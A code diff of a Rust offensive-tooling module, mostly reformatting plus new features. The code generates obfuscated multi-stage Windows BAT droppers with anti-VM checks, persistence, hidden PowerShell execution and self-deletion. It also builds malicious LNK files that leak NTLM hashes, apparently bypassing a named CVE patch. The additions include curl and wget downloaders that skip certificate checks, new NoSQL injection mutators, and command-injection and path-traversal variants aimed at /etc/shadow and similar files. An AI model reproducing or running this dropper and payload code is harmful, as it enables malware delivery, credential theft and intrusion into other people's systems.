@@ -6,10 +6,10 @@
 //!
 //! This keeps payload logic in one place, reusable across modules.
 
-use anyhow::{anyhow, Result, Context};
-use base64::{engine::general_purpose::STANDARD as BASE64_STANDARD, Engine as _};
+use anyhow::{Context, Result, anyhow};
+use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64_STANDARD};
 use data_encoding::{BASE32, BASE32HEX, BASE64, BASE64URL};
-use rand::{rng, seq::SliceRandom, prelude::IndexedRandom, RngExt};
+use rand::{RngExt, prelude::IndexedRandom, rng, seq::SliceRandom};
 use std::collections::{HashMap, HashSet};
 use std::fmt::Write as FmtWrite;
 use std::fs::File;
@@ -104,8 +104,7 @@ pub fn apply_encodings(input: &[u8], encodings: &[EncodingType]) -> Result<Strin
         data = encoded.into_bytes();
     }
 
-    String::from_utf8(data)
-        .context("Final encoding produced invalid UTF-8")
+    String::from_utf8(data).context("Final encoding produced invalid UTF-8")
 }
 
 pub fn encode_base16(data: &[u8]) -> String {
@@ -122,7 +121,8 @@ pub fn encode_shell_escape(text: &str) -> String {
     let mut result = String::with_capacity(text.len().saturating_mul(2));
     for c in text.chars() {
         match c {
-            ' ' | '*' | '$' | '`' | '|' | '&' | ';' | '>' | '<' | '(' | ')' | '{' | '}' | '[' | ']' | ',' | '?' | '~' | '!' | '#' => {
+            ' ' | '*' | '$' | '`' | '|' | '&' | ';' | '>' | '<' | '(' | ')' | '{' | '}' | '['
+            | ']' | ',' | '?' | '~' | '!' | '#' => {
                 result.push('\\');
                 result.push(c);
             }
@@ -156,8 +156,7 @@ pub fn encode_html(text: &str) -> String {
 
 /// Zero-width Unicode characters for invisible steganography
 const ZERO_WIDTH_CHARS: [char; 8] = [
-    '\u{200B}', '\u{200C}', '\u{200D}', '\u{200E}',
-    '\u{200F}', '\u{2060}', '\u{FEFF}', '\u{034F}',
+    '\u{200B}', '\u{200C}', '\u{200D}', '\u{200E}', '\u{200F}', '\u{2060}', '\u{FEFF}', '\u{034F}',
 ];
 
 pub fn encode_zero_width(data: &[u8]) -> String {
@@ -183,6 +182,40 @@ pub fn encode_zero_width(data: &[u8]) -> String {
         result.push(ZERO_WIDTH_CHARS[padded_bits as usize]);
     }
 
+    result
+}
+
+/// Inverse of [`encode_zero_width`]: walk the input chars, look up each
+/// zero-width symbol's 3-bit value (other characters are silently skipped so
+/// host text wrapping a steganographic payload still decodes), then re-pack
+/// bits MSB-first into bytes. The encoder may leave 0–2 trailing padding bits
+/// on the last symbol; those are dropped by the `floor(3*symbols / 8)` byte
+/// count and never become part of the output.
+pub fn decode_zero_width(text: &str) -> Vec<u8> {
+    let cap = text.chars().count() * 3 / 8;
+    let mut result = Vec::with_capacity(cap);
+    let mut buffer: u32 = 0;
+    let mut bits_in_buffer: u32 = 0;
+    for ch in text.chars() {
+        let bit_value: u32 = match ch {
+            '\u{200B}' => 0,
+            '\u{200C}' => 1,
+            '\u{200D}' => 2,
+            '\u{200E}' => 3,
+            '\u{200F}' => 4,
+            '\u{2060}' => 5,
+            '\u{FEFF}' => 6,
+            '\u{034F}' => 7,
+            _ => continue,
+        };
+        buffer = (buffer << 3) | bit_value;
+        bits_in_buffer += 3;
+        if bits_in_buffer >= 8 {
+            bits_in_buffer -= 8;
+            let byte = ((buffer >> bits_in_buffer) & 0xff) as u8;
+            result.push(byte);
+        }
+    }
     result
 }
 
@@ -225,13 +258,19 @@ pub fn base64_split_encode(url: &str) -> Result<(String, String)> {
         anyhow::bail!("URL must not be empty");
     }
     let (first, second) = url.split_at(char_boundary_mid(url));
-    Ok((BASE64_STANDARD.encode(first), BASE64_STANDARD.encode(second)))
+    Ok((
+        BASE64_STANDARD.encode(first),
+        BASE64_STANDARD.encode(second),
+    ))
 }
 
 /// Generate a multi-stage BAT payload chain
 pub fn write_bat_payload_chain(stage1_path: &str, url: &str, output_ps1: &str) -> Result<()> {
     if stage1_path.contains("..") {
-        anyhow::bail!("stage1_path must not contain path traversal (..): {}", stage1_path);
+        anyhow::bail!(
+            "stage1_path must not contain path traversal (..): {}",
+            stage1_path
+        );
     }
     if output_ps1.contains('\'') || output_ps1.contains(';') || output_ps1.contains("..") {
         anyhow::bail!("output_ps1 contains unsafe characters: {}", output_ps1);
@@ -245,8 +284,8 @@ pub fn write_bat_payload_chain(stage1_path: &str, url: &str, output_ps1: &str) -
         anyhow::bail!("output_ps1 contains dangerous characters for BAT context");
     }
     let mut symbols = vec![
-        "测试", "測試", "例え", "例子", "示例", "示意", "探索", "神秘",
-        "✂", "✈", "☎", "☂", "☯", "✉", "✏", "✒", "✇", "✈✂", "📌", "🎴", "項目", "数据", "样本", "分析",
+        "测试", "測試", "例え", "例子", "示例", "示意", "探索", "神秘", "✂", "✈", "☎", "☂", "☯",
+        "✉", "✏", "✒", "✇", "✈✂", "📌", "🎴", "項目", "数据", "样本", "分析",
     ];
     let mut rng = rng();
     symbols.shuffle(&mut rng);
@@ -258,7 +297,7 @@ pub fn write_bat_payload_chain(stage1_path: &str, url: &str, output_ps1: &str) -
     let (part1_b64, part2_b64) = base64_split_encode(url)?;
 
     let stage1_contents = format!(
-r#"@echo off
+        r#"@echo off
 setlocal EnableDelayedExpansion
 cls >nul
 set /a RND=1+%RANDOM%%%4
@@ -319,7 +358,8 @@ echo exit
 ) > "{s2}"
 start "" /B "{s2}"
 exit
-"#);
+"#
+    );
 
     std::fs::write(stage1_path, &stage1_contents)?;
     #[cfg(unix)]
@@ -336,7 +376,12 @@ exit
 
 /// Create a malicious LNK file for NTLM hash disclosure
 /// Uses local icon (shell32.dll) + remote target to bypass CVE-2025-50154 patch
-pub fn create_malicious_lnk(output_path: &Path, smb_ip: &str, smb_share: &str, smb_file: &str) -> Result<()> {
+pub fn create_malicious_lnk(
+    output_path: &Path,
+    smb_ip: &str,
+    smb_share: &str,
+    smb_file: &str,
+) -> Result<()> {
     let target_file = format!("\\\\{}\\{}\\{}", smb_ip, smb_share, smb_file);
     let icon_location = "%SystemRoot%\\System32\\SHELL32.dll";
     create_lnk_binary(output_path, &target_file, icon_location)
@@ -348,8 +393,8 @@ fn create_lnk_binary(output_path: &Path, target_path: &str, icon_location: &str)
     // LNK Header
     lnk_data.extend_from_slice(&0x4C_u32.to_le_bytes());
     lnk_data.extend_from_slice(&[
-        0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46
+        0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x46,
     ]);
     lnk_data.extend_from_slice(&0x0000009B_u32.to_le_bytes()); // LinkFlags
     lnk_data.extend_from_slice(&0x00000020_u32.to_le_bytes()); // FileAttributes
@@ -397,6 +442,8 @@ pub enum DownloadMethod {
     PowerShell,
     Certutil,
     Bitsadmin,
+    Curl,
+    Wget,
 }
 
 impl DownloadMethod {
@@ -405,12 +452,14 @@ impl DownloadMethod {
             "ps" | "powershell" => Some(Self::PowerShell),
             "cert" | "certutil" => Some(Self::Certutil),
             "bits" | "bitsadmin" => Some(Self::Bitsadmin),
+            "curl" => Some(Self::Curl),
+            "wget" => Some(Self::Wget),
             _ => None,
         }
     }
 
     pub fn options() -> &'static str {
-        "PowerShell [default], Certutil, Bitsadmin"
+        "PowerShell [default], Certutil, Bitsadmin, Curl, Wget"
     }
 }
 
@@ -421,7 +470,9 @@ pub struct DropperContext {
 
 impl DropperContext {
     pub fn new() -> Self {
-        Self { vars: HashMap::new() }
+        Self {
+            vars: HashMap::new(),
+        }
     }
 
     pub fn get(&mut self, key: &str) -> String {
@@ -436,7 +487,9 @@ impl DropperContext {
 
     pub fn rand_var_name(&self) -> String {
         let mut rng = rng();
-        let charset: Vec<char> = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".chars().collect();
+        let charset: Vec<char> = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+            .chars()
+            .collect();
         let mut name = String::with_capacity(8);
         for _ in 0..3 {
             if let Some(&ch) = charset.choose(&mut rng) {
@@ -458,8 +511,12 @@ const BANNERS: &[&str] = &[
 ];
 
 const DECOY_FILES: &[&str] = &[
-    "readme_v2.txt", "compliance_policy.pdf", "sys_log_2024.csv",
-    "audit_results.html", "patch_notes.rtf", "error_log.xml",
+    "readme_v2.txt",
+    "compliance_policy.pdf",
+    "sys_log_2024.csv",
+    "audit_results.html",
+    "patch_notes.rtf",
+    "error_log.xml",
 ];
 
 /// Generate anti-VM / anti-sandbox BAT checks
@@ -470,7 +527,8 @@ pub fn build_anti_vm(ctx: &mut DropperContext) -> String {
     let ram = ctx.get("ram");
     let ram_val = ctx.get("ram_val");
 
-    format!(r#"
+    format!(
+        r#"
     REM [ Check 1: Uptime & Boot Time ]
     set "{uptime}=0"
     for /f "skip=1" %%U in ('wmic os get LastBootUpTime ^| findstr /r /c:"^[0-9]"') do set "{uptime}=%%U"
@@ -493,7 +551,11 @@ pub fn build_anti_vm(ctx: &mut DropperContext) -> String {
         )
     )
     "#,
-        uptime=uptime, boot=boot, now=now, ram=ram, ram_val=ram_val
+        uptime = uptime,
+        boot = boot,
+        now = now,
+        ram = ram,
+        ram_val = ram_val
     )
 }
 
@@ -521,6 +583,12 @@ pub fn build_downloader(method: DownloadMethod, url: &str, outfile: &str) -> Str
             "bitsadmin /transfer \"SystemUpdate_{rnd}\" /priority FOREGROUND \"{safe_url_dq}\" \"%CD%\\{safe_outfile_dq}\" >nul",
             rnd = rng().random_range(1000..9999)
         ),
+        // curl.exe ships with Windows 10 1803+ and is ubiquitous on Linux.
+        DownloadMethod::Curl => format!("curl -s -k -o \"{safe_outfile_dq}\" \"{safe_url_dq}\""),
+        // wget (GNU/wget for Windows or Linux).
+        DownloadMethod::Wget => {
+            format!("wget --no-check-certificate -q -O \"{safe_outfile_dq}\" \"{safe_url_dq}\"")
+        }
     }
 }
 
@@ -529,7 +597,8 @@ pub fn build_narutto_stage3(ctx: &mut DropperContext, ps1_name: &str) -> String 
     let reg_name = ctx.get("reg_persist");
     let antivm = build_anti_vm(ctx);
 
-    format!(r#"
+    format!(
+        r#"
 @echo off
 setlocal enabledelayedexpansion
 REM == Phase 3: Verification & Setup ==
@@ -544,17 +613,28 @@ REM == Execute Payload ==
 echo [*] Starting background service...
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%%~dp0{ps1_name}" >nul 2>&1
 exit
-    "#, antivm=antivm, reg_name=reg_name, ps1_name=ps1_name)
+    "#,
+        antivm = antivm,
+        reg_name = reg_name,
+        ps1_name = ps1_name
+    )
 }
 
 /// Build Stage 2 (downloader) BAT content
-pub fn build_narutto_stage2(ctx: &mut DropperContext, method: DownloadMethod, url: &str, ps1_name: &str, stage3_name: &str) -> String {
+pub fn build_narutto_stage2(
+    ctx: &mut DropperContext,
+    method: DownloadMethod,
+    url: &str,
+    ps1_name: &str,
+    stage3_name: &str,
+) -> String {
     let antivm = build_anti_vm(ctx);
     let downloader = build_downloader(method, url, ps1_name);
     let stage3_content = build_narutto_stage3(ctx, ps1_name);
     let s3_var = ctx.get("s3_file");
 
-    let mut script = format!(r#"
+    let mut script = format!(
+        r#"
 @echo off
 setlocal enabledelayedexpansion
 REM == Phase 2: Component Acquisition ==
@@ -569,23 +649,30 @@ REM == Extract Stage 3 ==
 set "{s3_var}=%~dp0{stage3_name}"
 (
     "#,
-    antivm=antivm, downloader=downloader, ps1_name=ps1_name, s3_var=s3_var, stage3_name=stage3_name
+        antivm = antivm,
+        downloader = downloader,
+        ps1_name = ps1_name,
+        s3_var = s3_var,
+        stage3_name = stage3_name
     );
 
     for line in stage3_content.lines() {
         if !line.trim().is_empty() {
-             script.push_str(&format!("    echo {}\n", line.replace('%', "%%")));
+            script.push_str(&format!("    echo {}\n", line.replace('%', "%%")));
         } else {
-             script.push('\n');
+            script.push('\n');
         }
     }
 
-    script.push_str(&format!(r#"
+    script.push_str(&format!(
+        r#"
 ) > "%{s3_var}%"
 REM == Handoff to Stage 3 ==
 call "%{s3_var}%"
 exit
-"#, s3_var=s3_var));
+"#,
+        s3_var = s3_var
+    ));
 
     script
 }
@@ -598,10 +685,12 @@ pub fn build_narutto_stage1(
     decoy_urls: &[&str],
     ps1_name: &str,
     stage2_name: &str,
-    stage3_name: &str
+    stage3_name: &str,
 ) -> String {
     let batch_var = ctx.get("diag_id");
-    let banner_text = BANNERS.choose(&mut rng()).unwrap_or(&"System Diagnostic Tool");
+    let banner_text = BANNERS
+        .choose(&mut rng())
+        .unwrap_or(&"System Diagnostic Tool");
     let antivm = build_anti_vm(ctx);
 
     let mut decoy_section = String::new();
@@ -611,13 +700,17 @@ pub fn build_narutto_stage1(
     for (i, url) in decoy_urls.iter().enumerate().take(3) {
         let decoy_name = decoys_shuffled.get(i).unwrap_or(&"log.txt");
         let dl_cmd = build_downloader(DownloadMethod::PowerShell, url, decoy_name);
-        decoy_section.push_str(&format!("echo [*] Verifying component: {}\n{}\n", decoy_name, dl_cmd));
+        decoy_section.push_str(&format!(
+            "echo [*] Verifying component: {}\n{}\n",
+            decoy_name, dl_cmd
+        ));
     }
 
     let stage2_content = build_narutto_stage2(ctx, method, url_payload, ps1_name, stage3_name);
     let s2_var = ctx.get("s2_file");
 
-    let mut script = format!(r#"@echo off
+    let mut script = format!(
+        r#"@echo off
 setlocal enabledelayedexpansion
 REM =========================================================
 REM {banner} (v{v1}.{v2})
@@ -638,14 +731,14 @@ REM == Extract Stage 2 ==
 set "{s2_var}=%~dp0{stage2_name}"
 (
 "#,
-    banner=banner_text,
-    v1=rng().random_range(1..9),
-    v2=rng().random_range(0..99),
-    batch_var=batch_var,
-    antivm=antivm,
-    decoy_section=decoy_section,
-    s2_var=s2_var,
-    stage2_name=stage2_name
+        banner = banner_text,
+        v1 = rng().random_range(1..9),
+        v2 = rng().random_range(0..99),
+        batch_var = batch_var,
+        antivm = antivm,
+        decoy_section = decoy_section,
+        s2_var = s2_var,
+        stage2_name = stage2_name
     );
 
     for line in stage2_content.lines() {
@@ -656,14 +749,17 @@ set "{s2_var}=%~dp0{stage2_name}"
         }
     }
 
-    script.push_str(&format!(r#"
+    script.push_str(&format!(
+        r#"
 ) > "%{s2_var}%"
 REM == Handoff to Stage 2 ==
 call "%{s2_var}%"
 REM Cleanup
 del "%~f0" >nul 2>&1
 exit
-"#, s2_var=s2_var));
+"#,
+        s2_var = s2_var
+    ));
 
     script
 }
@@ -676,15 +772,20 @@ exit
 pub fn parse_delay(input: &str) -> Result<u32> {
     let lower = input.to_lowercase();
     if let Some(mins) = lower.strip_suffix('m') {
-        mins.parse().map_err(|e| anyhow!("Invalid minutes format: {e}"))
+        mins.parse()
+            .map_err(|e| anyhow!("Invalid minutes format: {e}"))
     } else if let Some(days) = lower.strip_suffix('d') {
-        let d: u32 = days.parse().map_err(|e| anyhow!("Invalid days format: {e}"))?;
+        let d: u32 = days
+            .parse()
+            .map_err(|e| anyhow!("Invalid days format: {e}"))?;
         // `d * 1440` overflows u32 past ~2.98M days (panic in debug, silent wrap
         // in release); reject oversized input instead.
         d.checked_mul(1440)
             .ok_or_else(|| anyhow!("Delay too large: {} days exceeds the maximum", d))
     } else {
-        input.parse().map_err(|e| anyhow!("Invalid delay format (use '10m' or '2d'): {e}"))
+        input
+            .parse()
+            .map_err(|e| anyhow!("Invalid delay format (use '10m' or '2d'): {e}"))
     }
 }
 
@@ -692,7 +793,9 @@ pub fn parse_delay(input: &str) -> Result<u32> {
 pub fn random_string(len: usize) -> String {
     let charset = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
     let mut rng = rng();
-    (0..len).map(|_| *charset.choose(&mut rng).unwrap_or(&b'A') as char).collect()
+    (0..len)
+        .map(|_| *charset.choose(&mut rng).unwrap_or(&b'A') as char)
+        .collect()
 }
 
 /// Generate a random uppercase variable name for BAT obfuscation
@@ -700,7 +803,9 @@ pub fn random_var() -> String {
     let charset = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
     let mut rng = rng();
     let len = rng.random_range(4..8);
-    (0..len).map(|_| *charset.choose(&mut rng).unwrap_or(&b'A') as char).collect()
+    (0..len)
+        .map(|_| *charset.choose(&mut rng).unwrap_or(&b'A') as char)
+        .collect()
 }
 
 /// Generate random junk BAT comments for obfuscation
@@ -709,24 +814,31 @@ pub fn generate_junk_comments() -> String {
     let count = rng.random_range(3..7);
     let mut s = String::new();
     for _ in 0..count {
-        if let Err(e) = writeln!(s, ":: {}", random_string(20)) { tracing::trace!("string write: {e}"); }
+        if let Err(e) = writeln!(s, ":: {}", random_string(20)) {
+            tracing::trace!("string write: {e}");
+        }
     }
     s
 }
 
 /// Escape special characters for BAT echo commands
 pub fn escape_bat_echo(content: &str) -> String {
-    content.lines().map(|line| {
-        let escaped = line.replace('%', "%%")
-                          .replace('^', "^^")
-                          .replace('&', "^&")
-                          .replace('<', "^<")
-                          .replace('>', "^>")
-                          .replace('|', "^|")
-                          .replace('(', "^(")
-                          .replace(')', "^)");
-        format!("echo {}", escaped)
-    }).collect::<Vec<_>>().join("\n")
+    content
+        .lines()
+        .map(|line| {
+            let escaped = line
+                .replace('%', "%%")
+                .replace('^', "^^")
+                .replace('&', "^&")
+                .replace('<', "^<")
+                .replace('>', "^>")
+                .replace('|', "^|")
+                .replace('(', "^(")
+                .replace(')', "^)");
+            format!("echo {}", escaped)
+        })
+        .collect::<Vec<_>>()
+        .join("\n")
 }
 
 /// Configuration for a polymorph 3-stage dropper.
@@ -797,7 +909,11 @@ if %errorlevel% neq 0 (
 )
 del "%~f0" >nul 2>&1
 "#,
-        vbs_echo_lines = vbs_content.lines().map(|l| format!("echo {}", l)).collect::<Vec<_>>().join("\n"),
+        vbs_echo_lines = vbs_content
+            .lines()
+            .map(|l| format!("echo {}", l))
+            .collect::<Vec<_>>()
+            .join("\n"),
         vbs_name = vbs_helper_name,
         time_calc_loop = time_calc_loop,
         task_name = task2_name,
@@ -993,6 +1109,9 @@ fn apply_all_mutations(
         PayloadCategory::NoSQLi => {
             extend_capped!(nosql_operator_variants(payload));
             extend_capped!(nosql_unicode_escape(payload));
+            extend_capped!(nosql_bracket_variants(payload));
+            extend_capped!(nosql_operator_wrap(payload));
+            extend_capped!(nosql_type_coercion(payload));
         }
         PayloadCategory::CMDi => {
             extend_capped!(cmd_separator_variants(payload));
@@ -1030,7 +1149,11 @@ fn mutator_encode_url(payload: &str) -> Vec<String> {
             if c.is_ascii_alphanumeric() {
                 c.to_string()
             } else {
-                c.to_string().as_bytes().iter().map(|b| format!("%{:02X}", b)).collect::<String>()
+                c.to_string()
+                    .as_bytes()
+                    .iter()
+                    .map(|b| format!("%{:02X}", b))
+                    .collect::<String>()
             }
         })
         .collect::<String>();
@@ -1038,10 +1161,13 @@ fn mutator_encode_url(payload: &str) -> Vec<String> {
     let selective = payload
         .chars()
         .map(|c| match c {
-            '\'' | '"' | ' ' | ';' | '|' | '&' | '<' | '>' | '(' | ')' | '/'
-            | '\\' | '{' | '}' | '$' | '`' | '!' | '#' | '%' | '=' | '.' => {
-                c.to_string().as_bytes().iter().map(|b| format!("%{:02X}", b)).collect::<String>()
-            }
+            '\'' | '"' | ' ' | ';' | '|' | '&' | '<' | '>' | '(' | ')' | '/' | '\\' | '{' | '}'
+            | '$' | '`' | '!' | '#' | '%' | '=' | '.' => c
+                .to_string()
+                .as_bytes()
+                .iter()
+                .map(|b| format!("%{:02X}", b))
+                .collect::<String>(),
             _ => c.to_string(),
         })
         .collect::<String>();
@@ -1170,7 +1296,11 @@ fn mutator_encode_mixed_partial(payload: &str) -> Vec<String> {
             if !c.is_ascii_alphanumeric() && c != ' ' {
                 special_idx += 1;
                 if special_idx % 2 == 0 {
-                    c.to_string().as_bytes().iter().map(|b| format!("%{:02X}", b)).collect::<String>()
+                    c.to_string()
+                        .as_bytes()
+                        .iter()
+                        .map(|b| format!("%{:02X}", b))
+                        .collect::<String>()
                 } else {
                     c.to_string()
                 }
@@ -1188,7 +1318,11 @@ fn mutator_encode_mixed_partial(payload: &str) -> Vec<String> {
             if !c.is_ascii_alphanumeric() && c != ' ' {
                 special_idx += 1;
                 if special_idx % 2 == 1 {
-                    c.to_string().as_bytes().iter().map(|b| format!("%{:02X}", b)).collect::<String>()
+                    c.to_string()
+                        .as_bytes()
+                        .iter()
+                        .map(|b| format!("%{:02X}", b))
+                        .collect::<String>()
                 } else {
                     c.to_string()
                 }
@@ -1255,15 +1389,17 @@ fn sql_comment_inject(payload: &str) -> Vec<String> {
         }
     }
 
-    let keywords = ["SELECT", "UNION", "FROM", "WHERE", "OR", "AND", "ORDER", "INSERT", "UPDATE", "DELETE", "DROP"];
+    let keywords = [
+        "SELECT", "UNION", "FROM", "WHERE", "OR", "AND", "ORDER", "INSERT", "UPDATE", "DELETE",
+        "DROP",
+    ];
     let upper = payload.to_uppercase();
     for kw in &keywords {
-        if upper.contains(kw)
-            && kw.len() >= 2 {
-                let mid = kw.len() / 2;
-                let split_kw = format!("{}/**/{}",  &kw[..mid], &kw[mid..]);
-                results.push(replace_case_insensitive(payload, kw, &split_kw));
-            }
+        if upper.contains(kw) && kw.len() >= 2 {
+            let mid = kw.len() / 2;
+            let split_kw = format!("{}/**/{}", &kw[..mid], &kw[mid..]);
+            results.push(replace_case_insensitive(payload, kw, &split_kw));
+        }
     }
 
     results.push(payload.replace("UNION", "/*!50000 UNION*/"));
@@ -1285,8 +1421,11 @@ fn sql_case_toggle(payload: &str) -> Vec<String> {
         .iter()
         .enumerate()
         .map(|(i, c)| {
-            if i % 2 == 0 { c.to_lowercase().to_string() }
-            else { c.to_uppercase().to_string() }
+            if i % 2 == 0 {
+                c.to_lowercase().to_string()
+            } else {
+                c.to_uppercase().to_string()
+            }
         })
         .collect();
     results.push(toggle1);
@@ -1295,8 +1434,11 @@ fn sql_case_toggle(payload: &str) -> Vec<String> {
         .iter()
         .enumerate()
         .map(|(i, c)| {
-            if i % 2 == 1 { c.to_lowercase().to_string() }
-            else { c.to_uppercase().to_string() }
+            if i % 2 == 1 {
+                c.to_lowercase().to_string()
+            } else {
+                c.to_uppercase().to_string()
+            }
         })
         .collect();
     results.push(toggle2);
@@ -1328,8 +1470,12 @@ fn sql_concat_split(payload: &str) -> Vec<String> {
         // char-boundary split: a raw `len()/2` byte index would panic on a
         // multi-byte-UTF-8 payload.
         let mid = char_boundary_mid(payload);
-        results.push(format!("CONCAT('{}','{}')", &payload[..mid], &payload[mid..]));
-        results.push(format!("'{}'+'{}'" , &payload[..mid], &payload[mid..]));
+        results.push(format!(
+            "CONCAT('{}','{}')",
+            &payload[..mid],
+            &payload[mid..]
+        ));
+        results.push(format!("'{}'+'{}'", &payload[..mid], &payload[mid..]));
         results.push(format!("'{}'||'{}'", &payload[..mid], &payload[mid..]));
         if payload.len() <= 20 {
             let chr_str: String = payload
@@ -1360,7 +1506,11 @@ fn sql_alternative_syntax(payload: &str) -> Vec<String> {
         results.push(replace_case_insensitive(payload, "OR 1=1", "OR 2>1"));
         results.push(replace_case_insensitive(payload, "OR 1=1", "OR 'a'='a'"));
         results.push(replace_case_insensitive(payload, "OR 1=1", "OR 1 LIKE 1"));
-        results.push(replace_case_insensitive(payload, "OR 1=1", "OR 1 BETWEEN 0 AND 2"));
+        results.push(replace_case_insensitive(
+            payload,
+            "OR 1=1",
+            "OR 1 BETWEEN 0 AND 2",
+        ));
     }
     if upper.contains("AND") {
         results.push(replace_case_insensitive(payload, "AND", "&&"));
@@ -1382,7 +1532,11 @@ fn sql_hex_encode_strings(payload: &str) -> Vec<String> {
                 if c == '\'' || c == '"' || c == ' ' {
                     c.to_string()
                 } else if c.is_alphabetic() {
-                    c.to_string().as_bytes().iter().map(|b| format!("0x{:02X}", b)).collect::<String>()
+                    c.to_string()
+                        .as_bytes()
+                        .iter()
+                        .map(|b| format!("0x{:02X}", b))
+                        .collect::<String>()
                 } else {
                     c.to_string()
                 }
@@ -1431,10 +1585,57 @@ fn nosql_unicode_escape(payload: &str) -> Vec<String> {
     vec![unicode]
 }
 
+/// Bracket / query-string operator-injection variants. PHP and Express's
+/// `qs`/`body-parser` parse `key[$ne]=x` into `{key:{$ne:x}}`, so wrapping the
+/// payload in operator brackets bypasses string-only filters.
+fn nosql_bracket_variants(payload: &str) -> Vec<String> {
+    let ops = ["$ne", "$gt", "$gte", "$lt", "$regex", "$nin", "$exists"];
+    let mut results = Vec::with_capacity(ops.len() * 2);
+    for op in &ops {
+        results.push(format!("[{}]={}", op, payload));
+        results.push(format!("{{\"{}\":{}}}", op, payload));
+    }
+    results
+}
+
+/// Operator-wrapping variants: embed the payload inside server-evaluated
+/// operators (`$where`/`$regex`/`$expr`) plus the classic always-true bypasses.
+fn nosql_operator_wrap(payload: &str) -> Vec<String> {
+    let escaped = payload.replace('"', "\\\"");
+    vec![
+        format!("{{\"$where\":\"{}\"}}", escaped),
+        format!("{{\"$regex\":\"{}\"}}", escaped),
+        format!(
+            "{{\"$expr\":{{\"$eq\":[\"{}\",\"{}\"]}}}}",
+            escaped, escaped
+        ),
+        "{\"$gt\":\"\"}".to_string(),
+        "{\"$ne\":null}".to_string(),
+    ]
+}
+
+/// JSON type-coercion variants — present the payload as a different JSON type
+/// (array, `$in` set, quoted vs unquoted) to dodge type-aware validators.
+fn nosql_type_coercion(payload: &str) -> Vec<String> {
+    let trimmed = payload.trim();
+    let mut results = vec![
+        format!("[{}]", trimmed),
+        format!("{{\"$in\":[{}]}}", trimmed),
+    ];
+    if let Some(inner) = trimmed.strip_prefix('"').and_then(|s| s.strip_suffix('"')) {
+        results.push(inner.to_string());
+    } else {
+        results.push(format!("\"{}\"", trimmed));
+    }
+    results
+}
+
 // --- Command Injection Mutations ---
 
 fn cmd_separator_variants(payload: &str) -> Vec<String> {
-    let separators = [";", "|", "||", "&&", "&", "\n", "\r\n", "%0a", "%0d%0a", "`", "$()"];
+    let separators = [
+        ";", "|", "||", "&&", "&", "\n", "\r\n", "%0a", "%0d%0a", "`", "$()",
+    ];
     let mut results = Vec::new();
 
     for sep in &separators {
@@ -1446,7 +1647,11 @@ fn cmd_separator_variants(payload: &str) -> Vec<String> {
     }
 
     for sep in &separators {
-        results.push(format!("{}{}", sep, payload.trim_start_matches([';', '|', '&', ' '])));
+        results.push(format!(
+            "{}{}",
+            sep,
+            payload.trim_start_matches([';', '|', '&', ' '])
+        ));
     }
 
     results
@@ -1529,11 +1734,16 @@ fn cmd_wildcard_bypass(payload: &str) -> Vec<String> {
 fn traversal_encoding_variants(payload: &str) -> Vec<String> {
     let mut results = Vec::new();
     let dot_dot_slash_encodings = [
-        "../", "..\\",
-        "..%2f", "..%5c",
-        "%2e%2e/", "%2e%2e%2f",
-        "%2e%2e\\", "%2e%2e%5c",
-        "..%252f", "..%255c",
+        "../",
+        "..\\",
+        "..%2f",
+        "..%5c",
+        "%2e%2e/",
+        "%2e%2e%2f",
+        "%2e%2e\\",
+        "%2e%2e%5c",
+        "..%252f",
+        "..%255c",
         "%252e%252e%252f",
         "%c0%ae%c0%ae/",
         "%c0%ae%c0%ae%c0%af",
@@ -1553,9 +1763,7 @@ fn traversal_encoding_variants(payload: &str) -> Vec<String> {
     ];
 
     for encoding in &dot_dot_slash_encodings {
-        let rebuilt = payload
-            .replace("../", encoding)
-            .replace("..\\", encoding);
+        let rebuilt = payload.replace("../", encoding).replace("..\\", encoding);
         if rebuilt != *payload {
             results.push(rebuilt);
         }
@@ -1567,14 +1775,21 @@ fn traversal_encoding_variants(payload: &str) -> Vec<String> {
 fn traversal_os_variants(payload: &str) -> Vec<String> {
     let mut results = Vec::new();
     let linux_files = [
-        "/etc/passwd", "/etc/shadow", "/etc/hosts",
-        "/proc/self/environ", "/proc/self/cmdline",
-        "/proc/1/cwd", "/var/log/auth.log",
-        "/etc/issue", "/etc/motd",
+        "/etc/passwd",
+        "/etc/shadow",
+        "/etc/hosts",
+        "/proc/self/environ",
+        "/proc/self/cmdline",
+        "/proc/1/cwd",
+        "/var/log/auth.log",
+        "/etc/issue",
+        "/etc/motd",
     ];
     let windows_files = [
-        "\\windows\\win.ini", "\\windows\\system.ini",
-        "\\boot.ini", "\\inetpub\\wwwroot\\web.config",
+        "\\windows\\win.ini",
+        "\\windows\\system.ini",
+        "\\boot.ini",
+        "\\inetpub\\wwwroot\\web.config",
         "\\windows\\system32\\drivers\\etc\\hosts",
     ];
 
@@ -1589,7 +1804,9 @@ fn traversal_os_variants(payload: &str) -> Vec<String> {
 }
 
 fn traversal_null_extension(payload: &str) -> Vec<String> {
-    let extensions = [".php", ".html", ".jsp", ".asp", ".aspx", ".txt", ".xml", ".json", ".log"];
+    let extensions = [
+        ".php", ".html", ".jsp", ".asp", ".aspx", ".txt", ".xml", ".json", ".log",
+    ];
     let mut results = Vec::new();
     for ext in &extensions {
         results.push(format!("{}%00{}", payload, ext));
@@ -1624,8 +1841,12 @@ fn traversal_double_dot_variants(payload: &str) -> Vec<String> {
 fn expand_traversal_depths(seeds: &[String], config: &MutatorConfig) -> Vec<String> {
     let mut results = Vec::new();
     let target_files = [
-        "etc/passwd", "etc/shadow", "etc/hosts",
-        "proc/self/environ", "windows/win.ini", "windows/system.ini",
+        "etc/passwd",
+        "etc/shadow",
+        "etc/hosts",
+        "proc/self/environ",
+        "windows/win.ini",
+        "windows/system.ini",
         "boot.ini",
     ];
     let separators = ["../", "..\\", "..%2f", "..%5c", "%2e%2e/", "%2e%2e%2f"];
@@ -1655,7 +1876,9 @@ fn expand_traversal_depths(seeds: &[String], config: &MutatorConfig) -> Vec<Stri
 // --- Mutator Utility Helpers ---
 
